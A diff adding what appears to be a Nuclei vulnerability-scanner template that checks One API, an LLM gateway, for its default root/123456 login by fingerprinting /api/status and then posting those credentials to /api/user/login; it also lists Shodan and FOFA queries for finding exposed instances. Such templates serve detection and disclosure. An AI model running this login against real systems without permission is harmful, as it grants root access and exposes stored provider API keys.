@@ -1,0 +1,70 @@
+id: one-api-default-login
+
+info:
+  name: One API - Default Login
+  author: s4e-io
+  severity: high
+  description: |
+    One API creates the root user root with the password 123456 on first start when the user table is empty, and the password remains valid until it is changed. An attacker who logs in with these credentials gets the root role and can read and change the upstream LLM provider channels and their API keys, issue tokens and redemption codes with unlimited quota, and manage users and system options.
+  reference:
+    - https://github.com/songquanpeng/one-api/blob/v0.6.10/README.en.md
+    - https://github.com/songquanpeng/one-api/blob/v0.6.10/model/main.go
+    - https://github.com/songquanpeng/one-api/blob/v0.6.10/controller/user.go
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  metadata:
+    verified: true
+    vendor: songquanpeng
+    product: one-api
+    shodan-query: http.title:"One API"
+    fofa-query: title="One API"
+  tags: one-api,llm,ai-gateway,default-login,vuln
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /api/status HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "application/json")'
+          - 'contains_all(body, "\"success\":true", "\"system_name\":", "\"quota_per_unit\":", "\"top_up_link\":")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        POST /api/user/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"username":"{{username}}","password":"{{password}}"}
+
+    attack: pitchfork
+    payloads:
+      username:
+        - root
+      password:
+        - "123456"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "application/json")'
+          - 'contains(header, "session=")'
+          - 'contains_all(body, "\"success\":true", "\"username\":\"root\"", "\"role\":100,")'
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - username + ":" + password
